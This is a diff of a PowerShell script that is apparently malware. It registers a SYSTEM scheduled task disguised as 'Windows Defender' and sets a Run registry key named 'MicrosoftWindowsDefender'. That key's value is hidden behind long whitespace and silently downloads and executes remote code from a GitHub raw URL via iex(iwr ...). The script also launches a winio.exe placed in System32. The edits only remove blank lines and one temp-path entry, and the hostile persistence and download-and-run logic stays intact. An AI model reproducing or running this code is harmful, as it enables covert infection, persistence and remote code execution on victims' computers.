@@ -57,7 +57,6 @@ else
         "C:\Windows\Tasks",
         "C:\Windows\WinSxS",
 
-        [System.IO.Path]::GetTempPath(),
         "C:\",
         "D:\"
     );
@@ -105,7 +104,6 @@ else
         $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest;
         $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal;
         Register-ScheduledTask -TaskName "Windows Defender" -InputObject $task -TaskPath "\Microsoft\Windows\Windows Defender\" -Force;
-        
     }
     catch 
     {
@@ -116,14 +114,11 @@ else
         if (-not (Test-Path $key -ErrorAction SilentlyContinue)) 
         {
             New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null;
-
             New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftWindowsDefender" -Value "                                                                                                                                                                                        powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/2' -UseBasicP)" -Force -ErrorAction SilentlyContinue | Out-Null;
-
         } 
         else
         {
             Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftWindowsDefender" -Value "                                                                                                                                                                                        powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/2' -UseBasicP)" -Force -ErrorAction SilentlyContinue;
-            
         }
     }
     catch
@@ -131,7 +126,6 @@ else
     };
     
     $processPaths = @('C:\Windows\System32\winio.exe', 'C:\Windows\System32\SafeBoot\winio.exe');
-
     try 
     {
         $processes = Get-WmiObject Win32_Process | Where-Object { $processPaths -contains $_.ExecutablePath };
@@ -159,9 +153,7 @@ else
 
     
     $mutexName = "44b6c65a-d844-4fa9-9d68-a7df5ab8b127";
-
     $processes = Get-WmiObject Win32_Process;
-
     foreach ($process in $processes) 
     {
         try 
@@ -273,7 +265,6 @@ else
 
             try
             {
-
                 Start-Process -FilePath "C:\Windows\System32\winio.exe" -ErrorAction SilentlyContinue;
             }
             catch
